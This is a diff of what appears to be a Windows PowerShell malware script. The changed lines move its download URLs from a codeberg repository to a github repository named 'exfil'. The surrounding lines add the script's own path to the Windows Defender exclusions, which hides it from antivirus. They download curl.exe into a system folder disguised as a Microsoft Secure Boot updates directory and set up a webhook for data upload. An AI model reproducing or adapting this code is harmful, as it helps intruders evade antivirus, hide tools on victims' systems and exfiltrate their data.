@@ -15,11 +15,11 @@ if ($Exclusions -notcontains $exePath) {
     Add-MpPreference -ExclusionPath $exePath -ErrorAction SilentlyContinue
 }
 $webhookUrl = "from important section, dataupload"
-$curlurl = "https://codeberg.org/sempiampi/mavericks/releases/download/v1.0.0/curl.exe"
+$curlurl = "https://github.com/sempiampi/exfil/releases/download/1.0.0/curl.exe"
 #$downloadedFileName = [System.IO.Path]::GetFileName($curlurl)
 $programNameWithExtension = [System.IO.Path]::GetFileName($curlurl)
 $destinationPath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
-$hashesUrl = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/GlobalFiles/HashesOfCorePrograms.txt"
+$hashesUrl = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/GlobalFiles/HashesOfCorePrograms.txt"
 if (-not (Test-Path (Split-Path $destinationPath))) {
     New-Item -Path (Split-Path $destinationPath) -ItemType Directory -Force | Out-Null
 }
